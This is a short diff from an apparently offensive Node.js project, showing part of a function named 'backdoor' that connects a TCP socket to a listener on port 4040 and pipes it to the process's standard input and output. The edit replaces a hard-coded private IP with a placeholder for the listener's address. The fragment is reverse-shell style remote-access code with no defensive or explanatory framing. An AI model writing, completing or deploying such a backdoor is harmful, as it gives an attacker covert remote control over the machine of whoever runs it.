@@ -5,7 +5,7 @@ const os = require('os');
 const backdoor = () => {
     const socket = new net.Socket();
 
-    socket.connect(4040, '192.168.2.193', () => {
+    socket.connect(4040, '<listner\'s ip address>', () => {
         // Connection established
         socket.pipe(process.stdin);
         socket.pipe(process.stdout);
